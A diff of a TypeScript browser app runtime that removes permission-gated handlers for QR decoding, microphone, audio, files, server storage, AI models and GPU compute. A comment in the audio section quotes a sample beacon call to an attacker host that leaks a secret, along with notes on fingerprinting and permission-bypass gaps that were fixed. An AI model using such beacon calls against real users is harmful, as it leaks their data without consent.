-    // to that host on the bundle's behalf — the same egress `softn.net.fetch`
-    // and `softn.audio.play` are held to. `qr` alone says nothing about the
-    // network; a data: or blob: image, the ordinary case, carries its bytes.
-    if (typeof imageDataUrl === 'string' && isRemoteUrl(imageDataUrl)) {
-      this.checkPermission('net');
-      this.checkNetHost(imageDataUrl);
-    }
-    // Use BarcodeDetector API if available
-    if ('BarcodeDetector' in globalThis) {
-      try {
-        const detector = new (
-          globalThis as unknown as {
-            BarcodeDetector: new (opts: { formats: string[] }) => {
-              detect: (img: HTMLImageElement) => Promise<Array<{ rawValue: string }>>;
-            };
-          }
-        ).BarcodeDetector({ formats: ['qr_code'] });
-        const img = new Image();
-        await new Promise<void>((resolve, reject) => {
-          let settled = false;
-          let timeout: ReturnType<typeof setTimeout> | null = null;
-
-          const finish = (error?: Error) => {
-            if (settled) return;
-            settled = true;
-            if (timeout) clearTimeout(timeout);
-            img.onload = null;
-            img.onerror = null;
-            this.qrDecodeCancelers.delete(cancel);
-            if (error) {
-              // Removing the source asks the browser to abandon any decode work
-              // still associated with this detached image.
-              img.removeAttribute('src');
-              reject(error);
-            } else {
-              resolve();
-            }
-          };
-          const cancel = () => finish(new Error('QR image load cancelled'));
-
-          this.qrDecodeCancelers.add(cancel);
-          img.onload = () => finish();
-          img.onerror = () => finish(new Error('Could not load QR image'));
-          timeout = setTimeout(
-            () => finish(new Error('QR image load timed out')),
-            SoftNScriptRuntime.QR_OPERATION_TIMEOUT_MS
-          );
-          img.src = imageDataUrl;
-        });
-        const results = await new Promise<Array<{ rawValue: string }>>((resolve, reject) => {
-          let settled = false;
-          const finish = (result?: Array<{ rawValue: string }>, error?: unknown) => {
-            if (settled) return;
-            settled = true;
-            clearTimeout(timeout);
-            this.qrDecodeCancelers.delete(cancel);
-            if (error) reject(error);
-            else resolve(result ?? []);
-          };
-          const cancel = () => finish(undefined, new Error('QR detection cancelled'));
-          const timeout = setTimeout(
-            () => finish(undefined, new Error('QR detection timed out')),
-            SoftNScriptRuntime.QR_OPERATION_TIMEOUT_MS
-          );
-
-          this.qrDecodeCancelers.add(cancel);
-          detector.detect(img).then(
-            (result) => finish(result),
-            (error) => finish(undefined, error)
-          );
-        });
-        if (results.length > 0) {
-          return { data: results[0].rawValue };
-        }
-      } catch {
-        /* fallthrough */
-      }
-    }
-    return { data: null, error: 'QR detection not available' };
   }
 
   private async handleCameraCapture(_call: PendingHostCall): Promise<unknown> {
@@ -3267,491 +2214,6 @@ export class SoftNScriptRuntime {
     return { stopped: true };
   }
 
-  // ── Microphone ──
-  //
-  // Gated, unlike audio playback. The comment below `── Audio ──` argues that
-  // sound is a nuisance rather than a disclosure because "it reads nothing,
-  // sends nothing" — a microphone is precisely the thing that fails that test.
-  //
-  // This is the script route, for an app that wants a recording without putting
-  // a viewfinder on screen. The `<Microphone>` component is the other route and
-  // opens the device itself, the same way `<Camera>` does; in both cases the
-  // browser's own permission prompt is what stands in front of the hardware.
-
-  /**
-   * Record from the default input and return it as a WAV data URL.
-   *
-   * Raw PCM rather than MediaRecorder's Opus: see runtime/wav.ts. Options are
-   * `seconds` (default 5), `sampleRate` (default 48000) and `processing`
-   * (default true — echo cancellation, noise suppression and gain control,
-   * which are right for speech and wrong for anything measuring the sound).
-   */
-  private async handleMicRecord(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('mic');
-
-    if (this.micRecording || this.micAcquisition) {
-      return { recorded: false, reason: 'already recording' };
-    }
-    if (typeof navigator === 'undefined' || !navigator.mediaDevices?.getUserMedia) {
-      return { recorded: false, reason: 'no microphone support' };
-    }
-
-    const [optionsJson] = call.args;
-    const options = optionsJson
-      ? (JSON.parse(optionsJson) as {
-          seconds?: number;
-          sampleRate?: number;
-          processing?: boolean;
-        })
-      : {};
-
-    const processing = options.processing !== false;
-    const wantedRate =
-      typeof options.sampleRate === 'number' && options.sampleRate > 0 ? options.sampleRate : 48000;
-    // A cap the bundle declared is a promise to the user that the consent
-    // dialog showed them, so it wins over whatever the script asks for.
-    const declaredCap = this.permissionConfig?.permissions.mic?.maxSeconds;
-    const requested =
-      typeof options.seconds === 'number' && options.seconds > 0 ? options.seconds : 5;
-    const seconds = Math.min(
-      requested,
-      typeof declaredCap === 'number' && declaredCap > 0 ? declaredCap : 300
-    );
-
-    const acquisition = { cancelled: false };
-    this.micAcquisition = acquisition;
-
-    let stream: MediaStream;
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        audio: {
-          echoCancellation: processing,
-          noiseSuppression: processing,
-          autoGainControl: processing,
-          sampleRate: { ideal: wantedRate },
-          channelCount: { ideal: 1 },
-        },
-      });
-    } catch (err) {
-      // A DOMException, which does not inherit from Error — reading `.message`
-      // directly is what keeps "Permission denied" from becoming "failed".
-      const name =
-        typeof err === 'object' && err !== null
-          ? ((err as { message?: string }).message ?? (err as { name?: string }).name)
-          : undefined;
-      if (this.micAcquisition === acquisition) this.micAcquisition = null;
-      return { recorded: false, reason: name ?? 'could not open the microphone' };
-    }
-
-    if (this.micAcquisition === acquisition) this.micAcquisition = null;
-    if (acquisition.cancelled || this.disposed) {
-      stream.getTracks().forEach((track) => track.stop());
-      return { recorded: false, reason: 'stopped' };
-    }
-
-    const AudioContextCtor =
-      (
-        globalThis as {
-          AudioContext?: typeof AudioContext;
-          webkitAudioContext?: typeof AudioContext;
-        }
-      ).AudioContext ??
-      (globalThis as { webkitAudioContext?: typeof AudioContext }).webkitAudioContext;
-    if (!AudioContextCtor) {
-      stream.getTracks().forEach((t) => t.stop());
-      return { recorded: false, reason: 'no Web Audio support' };
-    }
-
-    // Asking the context for the rate is what actually resamples: the
-    // getUserMedia constraint above is widely ignored, and a graph left at the
-    // hardware rate would hand back 44100 samples labelled 48000.
-    let context: AudioContext;
-    try {
-      try {
-        context = new AudioContextCtor({ sampleRate: wantedRate });
-      } catch {
-        context = new AudioContextCtor();
-      }
-    } catch (err) {
-      // Constructing an AudioContext can fail because the browser has reached
-      // its context limit or disabled Web Audio. The microphone stream was
-      // already granted at this point, so it must still be released.
-      stream.getTracks().forEach((track) => track.stop());
-      return { recorded: false, reason: String(err) };
-    }
-    const rate = context.sampleRate;
-
-    const blocks: Float32Array[] = [];
-    let total = 0;
-
-    return new Promise<unknown>((resolve) => {
-      let settled = false;
-      let timer: ReturnType<typeof setTimeout> | null = null;
-      let processor: ScriptProcessorNode | null = null;
-      let source: MediaStreamAudioSourceNode | null = null;
-      let sink: GainNode | null = null;
-
-      const finish = (reason: 'complete' | 'stopped') => {
-        if (settled) return;
-        settled = true;
-        if (timer) clearTimeout(timer);
-        this.micRecording = null;
-
-        if (processor) {
-          processor.onaudioprocess = null;
-          processor.disconnect();
-        }
-        if (source) source.disconnect();
-        if (sink) sink.disconnect();
-        void context.close().catch(() => {
-          /* already closed */
-        });
-        stream.getTracks().forEach((t) => t.stop());
-
-        const samples = new Float32Array(total);
-        let offset = 0;
-        for (const block of blocks) {
-          samples.set(block, offset);
-          offset += block.length;
-        }
-
-        resolve({
-          recorded: total > 0,
-          reason,
-          dataUrl: pcmToWavDataUrl(samples, rate),
-          sampleRate: rate,
-          sampleCount: total,
-          duration: total / rate,
-          mimeType: 'audio/wav',
-        });
-      };
-
-      try {
-        source = context.createMediaStreamSource(stream);
-        // ScriptProcessorNode rather than an AudioWorklet: a worklet has to be
-        // loaded from a URL, and the only URL the runtime can mint for itself
-        // is a blob — which a strict content security policy will refuse. The
-        // component takes the worklet route and falls back to this one; here,
-        // where there is no visible element to degrade, taking the reliable
-        // route directly is worth the main-thread cost of a short recording.
-        processor = context.createScriptProcessor(4096, 1, 1);
-        processor.onaudioprocess = (event) => {
-          if (settled) return;
-          // The buffer belongs to the next callback, so it is copied, not kept.
-          const block = event.inputBuffer.getChannelData(0);
-          blocks.push(new Float32Array(block));
-          total += block.length;
-        };
-        source.connect(processor);
-        // A ScriptProcessorNode only runs while connected to something. A
-        // zero-gain sink keeps it pulling without routing the microphone to the
-        // speakers, which would be a feedback loop.
-        sink = context.createGain();
-        sink.gain.value = 0;
-        processor.connect(sink);
-        sink.connect(context.destination);
-      } catch (err) {
-        settled = true;
-        stream.getTracks().forEach((t) => t.stop());
-        void context.close().catch(() => {});
-        resolve({ recorded: false, reason: String(err) });
-        return;
-      }
-
-      this.micRecording = { stop: finish };
-      timer = setTimeout(() => finish('complete'), Math.round(seconds * 1000));
-    });
-  }
-
-  /** End a recording early. The pending `mic.record` callback still fires. */
-  private async handleMicStop(): Promise<unknown> {
-    if (this.micRecording) {
-      this.micRecording.stop('stopped');
-      return { stopped: true };
-    }
-    if (!this.micAcquisition) return { stopped: false, reason: 'not recording' };
-    this.micAcquisition.cancelled = true;
-    return { stopped: true };
-  }
-
-  private async handleMicIsRecording(): Promise<unknown> {
-    return { recording: this.micRecording !== null || this.micAcquisition !== null };
-  }
-
-  /** Close any open microphone. Called from cleanup, and safe when idle. */
-  private stopMicrophone(): void {
-    if (this.micAcquisition) this.micAcquisition.cancelled = true;
-    this.micRecording?.stop('stopped');
-  }
-
-  // ── Audio ──
-  //
-  // Playing a bundle's own sound needs no capability: a `blob:`, `data:` or
-  // bundle-relative source carries its bytes with it, reads nothing and sends
-  // nothing, and a template can write `<audio src=… autoPlay>` for the same
-  // effect. A remote source is a different act. `new Audio(url)` issues the GET
-  // whether or not autoplay policy lets the sound out, and `audio.whenEnded`
-  // reports 'ended' separately from 'error' — so an unchecked remote src is not
-  // only a beacon, it is a read-back oracle telling the bundle whether the
-  // request succeeded. That is `softn.net.fetch` wearing a different name, and
-  // it goes behind the same gate and the same allowed_hosts list.
-  //
-  // This comment used to say "sound is a nuisance, not a disclosure: it reads
-  // nothing, sends nothing", and that reasoning was why no gate was here.
-  // Proven wrong against the real runtime: with every capability withheld,
-  // audio.play('https://attacker.example/beacon?secret=1') constructed the
-  // element with that exact URL and answered {played:true}.
-
-  /**
-   * Turn whatever the script passed into something an <audio> can load.
-   *
-   * Scripts say `softn.audio.play("assets/blip.wav")` — a path inside their own
-   * bundle, which only the host knows how to resolve. That is the same job
-   * `asset()` does for templates, so it is the same function doing it.
-   */
-  private resolveAudioSrc(src: string): string {
-    if (!src) return '';
-    if (/^(blob:|data:|https?:)/i.test(src)) return src;
-    const asset = this.externalFunctions?.asset;
-    if (typeof asset === 'function') {
-      const resolved = asset(src);
-      if (typeof resolved === 'string' && resolved) return resolved;
-    }
-    return src;
-  }
-
-  private async handleAudioPlay(call: PendingHostCall): Promise<unknown> {
-    if (typeof Audio === 'undefined') return { played: false, reason: 'no audio support' };
-
-    const [rawSrc, optionsJson] = call.args;
-    const options = optionsJson
-      ? (JSON.parse(optionsJson) as {
-          volume?: number;
-          loop?: boolean;
-          rate?: number;
-        })
-      : {};
-
-    const src = this.resolveAudioSrc(rawSrc);
-    if (!src) return { played: false, reason: `no such sound: ${rawSrc}` };
-
-    // Checked on the resolved URL, not the argument: `asset()` answers with a
-    // blob: or data: URL for a bundle path, and a path it does not recognise
-    // comes back unchanged — including a protocol-relative `//host/x`, which
-    // the browser resolves against the page's own http(s) scheme.
-    if (isRemoteUrl(src)) {
-      this.checkPermission('net');
-      this.checkNetHost(src);
-    }
-
-    const el = new Audio(src);
-    const own = typeof options.volume === 'number' ? Math.max(0, Math.min(1, options.volume)) : 1;
-    el.volume = own * this.audioMasterVolume;
-    el.loop = options.loop === true;
-    if (typeof options.rate === 'number' && options.rate > 0) el.playbackRate = options.rate;
-
-    const handle = `snd-${++this.audioSeq}`;
-    // The sound's own volume is kept beside it: master volume scales it, and
-    // reading it back off the element would fold the master in twice.
-    this.audioPlaying.set(handle, { el, volume: own, watchers: [] });
-    // One-shots clear themselves; loops stay until stopped or the app closes.
-    el.addEventListener(
-      'ended',
-      () => {
-        const outcome: AudioOutcome = { handle, status: 'ended' };
-        if (Number.isFinite(el.duration)) outcome.durationMs = el.duration * 1000;
-        this.finishAudio(handle, outcome);
-      },
-      { once: true }
-    );
-    // A src that fails to decode reports itself here, not through play() — a
-    // watcher waiting on the sound would otherwise wait forever.
-    el.addEventListener(
-      'error',
-      () => {
-        this.finishAudio(handle, {
-          handle,
-          status: 'error',
-          reason: el.error?.message || 'could not play',
-        });
-      },
-      { once: true }
-    );
-
-    try {
-      await el.play();
-      return { played: true, handle };
-    } catch (err) {
-      const name =
-        typeof err === 'object' && err !== null ? (err as { name?: string }).name : undefined;
-      // Browsers refuse to make noise before the user has interacted with the
-      // page. That is the policy working, not a fault, so it is reported rather
-      // than thrown — and a soundtrack (anything looping) is held back and
-      // started on the first gesture instead of being silently lost.
-      if (name === 'NotAllowedError') {
-        if (el.loop) {
-          this.armAudioUnlock(handle, el);
-          return { played: false, blocked: true, pending: true, handle };
-        }
-        this.audioPlaying.delete(handle);
-        return {
-          played: false,
-          blocked: true,
-          reason: 'the page has not been interacted with yet',
-        };
-      }
-      this.audioPlaying.delete(handle);
-      return { played: false, reason: name ?? 'could not play' };
-    }
-  }
-
-  /** Start a blocked loop as soon as the user touches the page, once. */
-  private armAudioUnlock(handle: string, el: HTMLAudioElement): void {
-    if (typeof window === 'undefined') return;
-    const start = () => {
-      window.removeEventListener('pointerdown', start);
-      window.removeEventListener('keydown', start);
-      this.audioUnlockers.delete(start);
-      // It may have been stopped, or the whole runtime torn down, while waiting.
-      if (this.disposed || !this.audioPlaying.has(handle)) return;
-      el.play().catch(() => {
-        this.finishAudio(handle, { handle, status: 'error', reason: 'could not play' });
-      });
-    };
-    this.audioUnlockers.add(start);
-    window.addEventListener('pointerdown', start, { once: true });
-    window.addEventListener('keydown', start, { once: true });
-  }
-
-  /**
-   * The one place a sound becomes past tense: watchers hear the outcome, the
-   * handle stops being live, and the outcome is kept for late askers. First
-   * outcome wins — a stop landing after an error, or the 'error' that clearing
-   * `src` on teardown fires, must not rewrite what already happened.
-   */
-  private finishAudio(handle: string, outcome: AudioOutcome): void {
-    const sound = this.audioPlaying.get(handle);
-    if (!sound) return;
-    for (const watcher of sound.watchers) watcher(outcome);
-    this.audioPlaying.delete(handle);
-    this.audioFinished.set(handle, outcome);
-    if (this.audioFinished.size > SoftNScriptRuntime.MAX_AUDIO_FINISHED) {
-      const oldest = this.audioFinished.keys().next().value;
-      if (oldest !== undefined) this.audioFinished.delete(oldest);
-    }
-  }
-
-  private async handleAudioStop(call: PendingHostCall): Promise<unknown> {
-    const [handle] = call.args;
-    if (!handle) return this.handleAudioStopAll();
-    const sound = this.audioPlaying.get(handle);
-    if (!sound) return { stopped: false };
-    sound.el.pause();
-    sound.el.currentTime = 0;
-    this.finishAudio(handle, { handle, status: 'stopped' });
-    return { stopped: true };
-  }
-
-  private async handleAudioStopAll(): Promise<unknown> {
-    const count = this.audioPlaying.size;
-    this.stopAllAudio();
-    return { stopped: count };
-  }
-
-  private async handleAudioSetVolume(call: PendingHostCall): Promise<unknown> {
-    const value = Number(call.args[0]);
-    if (!Number.isFinite(value)) return { volume: this.audioMasterVolume };
-    this.audioMasterVolume = Math.max(0, Math.min(1, value));
-    // Applies to what is already playing too, or turning the music down would
-    // only take effect on the next sound.
-    for (const sound of this.audioPlaying.values()) {
-      sound.el.volume = sound.volume * this.audioMasterVolume;
-    }
-    return { volume: this.audioMasterVolume };
-  }
-
-  /**
-   * Resolves when the sound is over, with how it got there: 'ended' on its
-   * own, 'stopped' by a script or teardown, 'error' if it never could play.
-   * The distinction is the point — being cut off must never read as having
-   * finished. A handle nothing remembers answers immediately: whatever it
-   * once named, it is not playing now.
-   */
-  private async handleAudioWhenEnded(call: PendingHostCall): Promise<unknown> {
-    const [handle] = call.args;
-    const finished = this.audioFinished.get(handle);
-    if (finished) return finished;
-    const sound = this.audioPlaying.get(handle);
-    if (!sound) return { handle, status: 'ended', known: false };
-    return new Promise<AudioOutcome>((resolve) => {
-      sound.watchers.push(resolve);
-    });
-  }
-
-  private stopAllAudio(): void {
-    for (const [handle, { el }] of this.audioPlaying) {
-      try {
-        el.pause();
-        el.src = '';
-      } catch {
-        // The element may already be detached; nothing left to stop.
-      }
-      this.finishAudio(handle, { handle, status: 'stopped' });
-    }
-    this.audioPlaying.clear();
-    if (typeof window !== 'undefined') {
-      for (const unlock of this.audioUnlockers) {
-        window.removeEventListener('pointerdown', unlock);
-        window.removeEventListener('keydown', unlock);
-      }
-    }
-    this.audioUnlockers.clear();
-  }
-
-  private async handleFilesPickFile(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('files');
-    const options = call.args[0] ? JSON.parse(call.args[0]) : {};
-    return new Promise<unknown>((resolve) => {
-      const input = document.createElement('input');
-      input.type = 'file';
-      if (options.accept) input.accept = options.accept;
-      if (options.multiple) input.multiple = true;
-      input.onchange = () => {
-        const files = Array.from(input.files || []);
-        const result = files.map((f) => ({
-          name: f.name,
-          size: f.size,
-          type: f.type,
-          ref: registerFileRef(f),
-        }));
-        resolve(result);
-      };
-      input.oncancel = () => resolve([]);
-      input.click();
-    });
-  }
-
-  private async handleFilesReadText(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('files');
-    const [fileRef] = call.args;
-    const file = getFileByRef(fileRef);
-    if (!file) throw new Error(`File not found: ${fileRef}`);
-    return await file.text();
-  }
-
-  private async handleFilesReadBase64(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('files');
-    const [fileRef] = call.args;
-    const file = getFileByRef(fileRef);
-    if (!file) throw new Error(`File not found: ${fileRef}`);
-    return new Promise<string>((resolve, reject) => {
-      const reader = new FileReader();
-      reader.onload = () => resolve(reader.result as string);
-      reader.onerror = () => reject(new Error('Failed to read file'));
-      reader.readAsDataURL(file);
-    });
-  }
-
   /**
    * `softn.input.captureKeys(keys)`: the keys whose browser default the
    * window bridge cancels before the script's handler sees them. Not a
@@ -3762,289 +2224,6 @@ export class SoftNScriptRuntime {
     const keys = parseCapturedKeys(call.args[0]);
     setCapturedKeys(this, keys);
     return { captured: keys.length };
-  }
-
-  /**
-   * Save a file the app produced: the content becomes a Blob and the browser's
-   * own download handles the rest, so where it lands and whether it is
-   * confirmed is the user's setting, not the app's. Text by default; with
-   * `base64: true` the content is decoded to bytes first, which is how an
-   * app hands over an image or a zip. Gated with the other file calls: an
-   * app that may open the user's files may also give them one.
-   */
-  private async handleFilesSaveFile(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('files');
-    const [rawName, content, optionsJson] = call.args;
-    let options: { mime?: string; base64?: boolean } = {};
-    if (optionsJson) {
-      try {
-        options = JSON.parse(optionsJson) as { mime?: string; base64?: boolean };
-      } catch {
-        return { error: 'The save options are not valid JSON.' };
-      }
-    }
-    // A download the person asked for, with a click or a key: not one an app
-    // starts on a timer, as many as it likes, attributed to the host's site.
-    const activation = typeof navigator === 'undefined' ? undefined : (navigator as { userActivation?: { isActive?: boolean } }).userActivation;
-    if (activation && activation.isActive === false) {
-      return { error: 'A file is saved when the person asks for it: call files.saveFile from a click or a key press.' };
-    }
-    const name = downloadName(rawName);
-    // A type the content says it is, or bytes.
-    const mime =
-      typeof options.mime === 'string' && /^[\w.+-]+\/[\w.+-]+(?:;\s*charset=[\w-]+)?$/.test(options.mime)
-        ? options.mime
-        : options.base64
-          ? 'application/octet-stream'
-          : 'text/plain;charset=utf-8';
-    let blob: Blob;
-    if (options.base64) {
-      let buffer: ArrayBuffer;
-      try {
-        const bin = atob(String(content || '').replace(/^data:[^,]*,/, ''));
-        buffer = new ArrayBuffer(bin.length);
-        const bytes = new Uint8Array(buffer);
-        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
-      } catch {
-        return { error: 'The content is not valid base64.' };
-      }
-      blob = new Blob([buffer], { type: mime });
-    } else {
-      blob = new Blob([String(content ?? '')], { type: mime });
-    }
-    if (typeof document === 'undefined' || typeof URL === 'undefined' || typeof URL.createObjectURL !== 'function') {
-      return { error: 'Saving files is not available here.' };
-    }
-    const url = URL.createObjectURL(blob);
-    try {
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = name;
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
-      a.remove();
-    } finally {
-      // The click has started the download; the URL only needs to outlive it.
-      setTimeout(() => URL.revokeObjectURL(url), 30_000);
-    }
-    return { ok: true, name, size: blob.size };
-  }
-
-  // ── Server storage (softn.storage.*) ──
-
-  /**
-   * One operation against the app's own database on the directory that
-   * published it. The runtime knows nothing of SQL: the script asks for
-   * records and keys, the request carries the operation and its arguments as
-   * JSON, and the server enforces its quotas and its limits. An app opened
-   * from a file rather than from a directory has no endpoint and is told so,
-   * in the same `{error}` shape every other refused call uses.
-   */
-  private async handleStorageOp(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('storage');
-    const [op, argsJson] = call.args;
-    if (!this.storageEndpoint) {
-      return {
-        error: 'This app has no server storage: it was not opened from a directory that publishes it.',
-      };
-    }
-    let args: Record<string, unknown> = {};
-    if (argsJson) {
-      try {
-        args = JSON.parse(argsJson) as Record<string, unknown>;
-      } catch {
-        return { error: 'The storage arguments are not valid JSON.' };
-      }
-    }
-    const abortController = new AbortController();
-    const timeout = setTimeout(() => abortController.abort(), 20_000);
-    this.netAbortControllers.add(abortController);
-    try {
-      // The visitor's standing for collections that record who added what.
-      // The host's token if it gave one; else this browser's; else none, and
-      // such collections refuse with a message that says why.
-      const token = this.visitorToken === undefined ? storageVisitorToken() : this.visitorToken;
-      const headers: Record<string, string> = { 'Content-Type': 'application/json' };
-      if (token) headers['X-Visitor-Token'] = token;
-      const resp = await fetch(this.storageEndpoint, {
-        method: 'POST',
-        headers,
-        body: JSON.stringify({ op, ...args }),
-        signal: abortController.signal,
-        credentials: 'same-origin',
-      });
-      const text = await resp.text();
-      let json: { ok?: boolean; result?: unknown; error?: string; retryAfter?: number } | null = null;
-      try {
-        json = JSON.parse(text);
-      } catch {
-        json = null;
-      }
-      if (!resp.ok || !json || json.ok !== true) {
-        return {
-          error: json?.error ?? `The storage server answered ${resp.status}.`,
-          status: resp.status,
-          retryAfter: json?.retryAfter,
-        };
-      }
-      return json.result ?? null;
-    } catch (err) {
-      if (abortController.signal.aborted) return { error: 'The storage request timed out.' };
-      return { error: err instanceof Error ? err.message : String(err) };
-    } finally {
-      clearTimeout(timeout);
-      this.netAbortControllers.delete(abortController);
-    }
-  }
-
-  // ── AI host call handlers ──
-
-  private async getModelHost(): Promise<import('./models/model-host').ModelHost> {
-    if (!this.modelHost) {
-      const { ModelHost } = await import('./models/model-host');
-      // The net declaration rides along: a model URL is egress like any other.
-      this.modelHost = new ModelHost({
-        ai: this.permissionConfig?.permissions.ai,
-        net: this.permissionConfig?.permissions.net,
-        readBundleFile: (path) => this.readBundleBlob(path),
-      });
-    }
-    return this.modelHost;
-  }
-
-  private async handleAIGetCapabilities(): Promise<unknown> {
-    // The only capability-shaped handler that answered anyone. It reports
-    // webgpu/webgl/wasm availability and a maxModelSizeMB derived from
-    // navigator.deviceMemory — a device fingerprint .logic has no other route
-    // to — and it answered a bundle shipping no permission.json, and a bundle
-    // whose consent bar was still up.
-    this.checkPermission('ai');
-    const { detectCapabilities } = await import('./ai-manager');
-    return detectCapabilities();
-  }
-
-  private async handleAIReleaseAll(): Promise<unknown> {
-    this.modelHost?.releaseAll();
-    if (this.gpuComputeManager) await this.gpuComputeManager.releaseAll();
-    return { released: true };
-  }
-
-  private async handleAIModelLoad(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('ai');
-    const [spec, optionsJson] = call.args;
-    // A string names a Hugging Face repository or a URL; an object says which
-    // ({huggingface, file}, {url} or {bundle}).
-    const source = typeof spec === 'string' && spec.trimStart().startsWith('{') ? JSON.parse(spec) : spec;
-    const options = optionsJson ? JSON.parse(optionsJson) : {};
-    const host = await this.getModelHost();
-    return host.load(source, options && typeof options === 'object' ? options : {});
-  }
-
-  private async handleAIModelGenerate(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('ai');
-    const [modelHandle, messagesJson, optionsJson] = call.args;
-    const messages = JSON.parse(messagesJson);
-    const options = optionsJson ? JSON.parse(optionsJson) : {};
-    const host = await this.getModelHost();
-    return host.generate(modelHandle, messages, options && typeof options === 'object' ? options : {});
-  }
-
-  private async handleAIModelRelease(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('ai');
-    const [modelHandle] = call.args;
-    return { released: this.modelHost?.release(String(modelHandle ?? '')) ?? false };
-  }
-
-  // ── GPU compute host call handlers ──
-
-  private async getGpuComputeManager(): Promise<
-    import('./ai-gpu-compute-manager').GpuComputeManager
-  > {
-    if (!this.gpuComputeManager) {
-      const { GpuComputeManager } = await import('./ai-gpu-compute-manager');
-      this.gpuComputeManager = new GpuComputeManager();
-      if (this.bundleFileProvider) {
-        this.gpuComputeManager.setBundleFileProvider(this.bundleFileProvider);
-      }
-      if (this.permissionConfig?.permissions.gpu) {
-        this.gpuComputeManager.setPermissionConfig(this.permissionConfig.permissions.gpu);
-      }
-    }
-    return this.gpuComputeManager;
-  }
-
-  private async handleGpuRequestDevice(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('gpu');
-    const options = call.args[0] ? JSON.parse(call.args[0]) : {};
-    const mgr = await this.getGpuComputeManager();
-    return mgr.requestDevice(options);
-  }
-
-  private async handleGpuCreateBuffer(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('gpu');
-    const [sourceJson, usage] = call.args;
-    const source = JSON.parse(sourceJson);
-    const mgr = await this.getGpuComputeManager();
-    return mgr.createBuffer(source, usage);
-  }
-
-  private async handleGpuWriteBuffer(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('gpu');
-    const [bufferId, dataJson, dtype] = call.args;
-    const data = JSON.parse(dataJson);
-    const mgr = await this.getGpuComputeManager();
-    return mgr.writeBuffer(bufferId, data, dtype || undefined);
-  }
-
-  private async handleGpuCreateShader(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('gpu');
-    const [sourceJson] = call.args;
-    const source = JSON.parse(sourceJson);
-    const mgr = await this.getGpuComputeManager();
-    return mgr.createShader(source);
-  }
-
-  private async handleGpuCreatePipeline(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('gpu');
-    const [optionsJson] = call.args;
-    const options = JSON.parse(optionsJson);
-    const mgr = await this.getGpuComputeManager();
-    return mgr.createPipeline(options);
-  }
-
-  private async handleGpuDispatch(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('gpu');
-    const [pipelineId, bindingsJson, workgroupsJson] = call.args;
-    const bindings = JSON.parse(bindingsJson);
-    const workgroups = JSON.parse(workgroupsJson);
-    const mgr = await this.getGpuComputeManager();
-    return mgr.dispatch(pipelineId, bindings, workgroups);
-  }
-
-  private async handleGpuReadBuffer(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('gpu');
-    const [bufferId] = call.args;
-    const mgr = await this.getGpuComputeManager();
-    return mgr.readBuffer(bufferId);
-  }
-
-  private async handleGpuRelease(call: PendingHostCall): Promise<unknown> {
-    this.checkPermission('gpu');
-    const [resourceId] = call.args;
-    const mgr = await this.getGpuComputeManager();
-    return mgr.release(resourceId);
-  }
-
-  private async handleGpuReleaseAll(): Promise<unknown> {
-    // The only gpu handler that reached getGpuComputeManager unchecked, and the
-    // getter only wires the declared limits into a manager it is creating. A
-    // denied app calling this built the manager with no config at all, and the
-    // `if (!this.gpuComputeManager)` cache meant the buffer cap and the shader
-    // allowlist were then missing for the rest of the session.
-    this.checkPermission('gpu');
-    const mgr = await this.getGpuComputeManager();
-    return mgr.releaseAll();
   }
 }
 
@@ -4074,53 +2253,6 @@ export function createScriptRuntime(
     bundleFileProvider,
     externalFunctions
   );
-}
-
-/**
- * The host-injected functions as the script sees them: a snapshot of every
- * synchronous primitive-valued getter, declared as a function returning its
- * value. This is the contract the main-thread runtime compiles (step 4 of its
- * loadScript), extracted so a script hosted in a worker is handed the same
- * declarations. `xdb_*` and `asset` are served by other bridges and skipped,
- * as they are there. The worker's snapshot is taken once, at load: nothing
- * refreshes it afterwards, where the main thread refreshes its table on every
- * call — a known gap, acceptable for values that do not move while an app runs.
- */
-export function buildExternalValuesPreamble(
-  externalFunctions: Record<string, (...args: unknown[]) => unknown> | null | undefined
-): string {
-  if (!externalFunctions) return '';
-  const names: string[] = [];
-  const values: unknown[] = [];
-  for (const name of Object.keys(externalFunctions)) {
-    if (!VALID_IDENTIFIER.test(name) || EXTERNAL_FUNCTION_RESERVED_NAMES.has(name)) continue;
-    if (name.startsWith('xdb_') || name === 'asset') continue;
-    let value: ExternalValueRead;
-    try {
-      const fn = externalFunctions[name];
-      if (typeof fn !== 'function') continue;
-      const result = fn();
-      if (result != null && typeof (result as { then?: unknown }).then === 'function') {
-        Promise.resolve(result).catch(() => {});
-        continue;
-      }
-      value = normalizeExternalPrimitive(result);
-    } catch {
-      continue;
-    }
-    if (value === UNSUPPORTED_EXTERNAL_VALUE) continue;
-    names.push(name);
-    values.push(value);
-  }
-  if (names.length === 0) return '';
-  const serialized = values.map((v) => (v === undefined ? 'undefined' : JSON.stringify(v))).join(',');
-  let preamble = `let ${EXTERNAL_VALUES_VAR} = [${serialized}];
-`;
-  for (let i = 0; i < names.length; i++) {
-    preamble += `function ${names[i]}() { return ${EXTERNAL_VALUES_VAR}[${i}]; }
-`;
-  }
-  return preamble;
 }
 
 /** What the Web Worker runtime asks of the main thread; see `createHostCallExecutor`. */
